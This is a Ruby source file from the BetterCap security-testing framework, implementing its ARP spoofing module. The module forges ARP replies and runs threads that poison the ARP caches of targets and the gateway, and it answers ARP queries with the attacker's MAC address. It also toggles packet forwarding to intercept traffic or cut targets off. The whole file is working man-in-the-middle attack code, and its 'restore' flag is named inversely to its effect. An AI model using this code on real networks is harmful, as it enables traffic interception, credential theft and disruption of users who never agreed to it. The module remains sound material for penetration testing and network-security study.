# encoding: UTF-8
=begin

BETTERCAP

Author : Simone 'evilsocket' Margaritelli
Email  : evilsocket@gmail.com
Blog   : http://www.evilsocket.net/

This project is released under the GPL 3 license.

=end
require 'bettercap/spoofers/base'

module BetterCap
module Spoofers
# This class is responsible of performing ARP spoofing on the network.
class Arp < Base
  # Initialize the BetterCap::Spoofers::Arp object.
  def initialize
    @ctx          = Context.get
    @gateway      = nil
    @forwarding   = @ctx.firewall.forwarding_enabled?
    @spoof_thread = nil
    @sniff_thread = nil
    @capture      = nil
    @running      = false

    update_gateway!
  end

  # Send a spoofed ARP reply to the target identified by the +daddr+ IP address
  # and +dmac+ MAC address, spoofing the +saddr+ IP address and +smac+ MAC
  # address as the source device.
  def send_spoofed_packet( saddr, smac, daddr, dmac )
    pkt = PacketFu::ARPPacket.new
    pkt.eth_saddr = smac
    pkt.eth_daddr = dmac
    pkt.arp_saddr_mac = smac
    pkt.arp_daddr_mac = dmac
    pkt.arp_saddr_ip = saddr
    pkt.arp_daddr_ip = daddr
    pkt.arp_opcode = 2

    @ctx.packets.push(pkt)
  end

  # Start the ARP spoofing.
  def start
    Logger.debug "Starting ARP spoofer ( #{@ctx.options.half_duplex ? 'Half' : 'Full'} Duplex ) ..."

    stop() if @running
    @running = true

    if @ctx.options.kill
      Logger.warn "Disabling packet forwarding."
      @ctx.firewall.enable_forwarding(false) if @forwarding
    else
      @ctx.firewall.enable_forwarding(true) unless @forwarding
    end

    @sniff_thread = Thread.new { arp_watcher }
    @spoof_thread = Thread.new { arp_spoofer }
  end

  # Stop the ARP spoofing, reset firewall state and restore targets ARP table.
  def stop
    raise 'ARP spoofer is not running' unless @running

    Logger.debug 'Stopping ARP spoofer ...'
    Logger.debug "Resetting packet forwarding to #{@forwarding} ..."
    @ctx.firewall.enable_forwarding( @forwarding )

    @running = false
    begin
      @spoof_thread.exit
    rescue
    end

    Logger.debug "Restoring ARP table of #{@ctx.targets.size} targets ..."

    @ctx.targets.each do |target|
      unless target.ip.nil? or target.mac.nil?
        spoof(target)
      end
    end
  end

  private

  # Send an ARP spoofing packet to +target+, if +restore+ is true it will
  # restore its ARP cache instead.
  def spoof( target, restore = false )
    if restore
      send_spoofed_packet( @gateway.ip, @ctx.ifconfig[:eth_saddr], target.ip, target.mac )
      send_spoofed_packet( target.ip, @ctx.ifconfig[:eth_saddr], @gateway.ip, @gateway.mac ) unless @ctx.options.half_duplex
    else
      send_spoofed_packet( @gateway.ip, @gateway.mac, target.ip, target.mac )
      send_spoofed_packet( target.ip, target.mac, @gateway.ip, @gateway.mac ) unless @ctx.options.half_duplex
    end
  end

  # Main spoofer loop.
  def arp_spoofer
    spoof_loop(1) { |target|
      unless target.ip.nil? or target.mac.nil?
        spoof(target, true)
      end
    }
  end

  # Return true if the +pkt+ packet is an ARP 'who-has' query coming
  # from some network endpoint.
  def is_arp_query?(pkt)
    # we're only interested in 'who-has' packets
    pkt.arp_opcode == 1 and \
    pkt.arp_dst_mac.to_s == '00:00:00:00:00:00' and \
    pkt.arp_src_ip.to_s != @ctx.ifconfig[:ip_saddr]
  end

  # Will watch for incoming ARP requests and spoof the source address.
  def arp_watcher
    Logger.debug 'ARP watcher started ...'

    sniff_packets('arp') { |pkt|
      if is_arp_query?(pkt)
        Logger.info "[#{'ARP'.green}] #{pkt.arp_src_ip.to_s} is asking who #{pkt.arp_dst_ip.to_s} is."
        send_spoofed_packet pkt.arp_dst_ip.to_s, @ctx.ifconfig[:eth_saddr], pkt.arp_src_ip.to_s, pkt.arp_src_mac.to_s
      end
    }
  end
end
end
end
